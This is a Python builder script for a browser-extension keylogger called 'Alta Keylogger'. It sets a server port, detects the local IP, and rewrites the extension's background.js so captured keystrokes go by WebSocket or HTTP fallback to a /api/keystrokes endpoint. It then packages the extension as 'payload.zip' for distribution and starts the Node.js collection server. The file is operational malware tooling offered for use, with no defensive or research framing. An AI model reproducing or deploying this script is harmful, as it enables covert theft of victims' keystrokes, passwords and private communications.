#!/usr/bin/env python3
import re
import subprocess
import sys
import socket
import zipfile
from pathlib import Path

# Colors for clean output
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def get_local_ip():
    """Auto-detect the primary LAN IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def replace_in_file(file_path, pattern, replacement, description):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        new_content, count = re.subn(pattern, replacement, content, count=1)
        if count == 0:
            print(f"{RED}⚠️  Pattern not found in {file_path}{RESET}")
            return False
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(new_content)
        print(f"{GREEN}✅ {description}{RESET}")
        return True
    except Exception as e:
        print(f"{RED}❌ Error: {e}{RESET}")
        return False

def create_payload_zip(source_dir, output_zip):
    """Zip the entire keylogger-extension folder silently."""
    try:
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in source_dir.rglob("*"):
                if file.is_file():
                    arcname = file.relative_to(source_dir.parent)  # keeps folder structure
                    zipf.write(file, arcname)
        return True
    except Exception as e:
        print(f"{RED}❌ Failed to create payload.zip: {e}{RESET}")
        return False

def main():
    print(f"\n{BOLD}{CYAN}🔧 Alta Keylogger Setup{RESET}\n")
    
    # Ask only for the port
    port = input(f"{YELLOW}📡 Enter server port {RESET}(default 3000): ").strip()
    if not port:
        port = "3000"
    try:
        port = str(int(port))
    except ValueError:
        print(f"{RED}❌ Invalid port. Using 3000.{RESET}")
        port = "3000"
    
    # Auto‑detect local IP
    server_ip = get_local_ip()
    print(f"{CYAN}📍 Detected local IP: {YELLOW}{server_ip}{RESET}\n")
    
    # Paths
    script_dir = Path(__file__).parent
    server_js = script_dir / "server.js"
    background_js = script_dir / "keylogger-extension" / "background.js"
    extension_dir = script_dir / "keylogger-extension"
    payload_zip = script_dir / "payload.zip"
    
    # Check required files
    if not server_js.exists():
        print(f"{RED}❌ server.js not found in {script_dir}{RESET}")
        sys.exit(1)
    if not background_js.exists():
        print(f"{RED}❌ background.js not found in {script_dir / 'keylogger-extension'}{RESET}")
        sys.exit(1)
    if not extension_dir.exists():
        print(f"{RED}❌ keylogger-extension folder not found{RESET}")
        sys.exit(1)
    
    print(f"{CYAN}⚙️  Applying updates...{RESET}\n")
    
    # 1. Update PORT in server.js
    replace_in_file(server_js,
                    r'(const\s+PORT\s*=\s*)\d+(\s*;)',
                    rf'\g<1>{port}\g<2>',
                    "Server port updated")
    
    # 2. Update WebSocket URL in background.js
    replace_in_file(background_js,
                    r"(const\s+SERVER_URL\s*=\s*')(ws://[^']+)(';)",
                    rf"\g<1>ws://{server_ip}:{port}\g<3>",
                    "WebSocket URL updated")
    
    # 3. Update HTTP fallback URL in background.js
    replace_in_file(background_js,
                    r"(const\s+HTTP_FALLBACK_URL\s*=\s*')(http://[^']+)(';)",
                    rf"\g<1>http://{server_ip}:{port}/api/keystrokes\g<3>",
                    "HTTP fallback URL updated")
    
    # 4. Create payload.zip silently
    print(f"{CYAN}📦 Creating payload.zip...{RESET}")
    if create_payload_zip(extension_dir, payload_zip):
        size = payload_zip.stat().st_size / 1024
        print(f"{GREEN}✅ Payload ready: {payload_zip} ({size:.2f} KB){RESET}")
    else:
        print(f"{RED}❌ Could not create payload.zip, but continuing...{RESET}")
    
    print(f"\n{GREEN}{BOLD}🎉 Configuration complete!{RESET}")
    print(f"   {CYAN}→ Server will listen on port {YELLOW}{port}{RESET}")
    print(f"   {CYAN}→ Extension will connect to {YELLOW}ws://{server_ip}:{port}{RESET}")
    print(f"   {CYAN}→ Payload file: {YELLOW}{payload_zip}{RESET}\n")
    
    # Automatically start the server
    print(f"{BOLD}{CYAN}🚀 Starting Node.js server...{RESET} (Press Ctrl+C to stop)\n")
    try:
        subprocess.run(["node", str(server_js)], check=True)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⏹️  Server stopped.{RESET}")
    except FileNotFoundError:
        print(f"{RED}❌ Node.js not found. Please install Node.js and ensure 'node' is in PATH.{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{RED}❌ Failed to run server: {e}{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
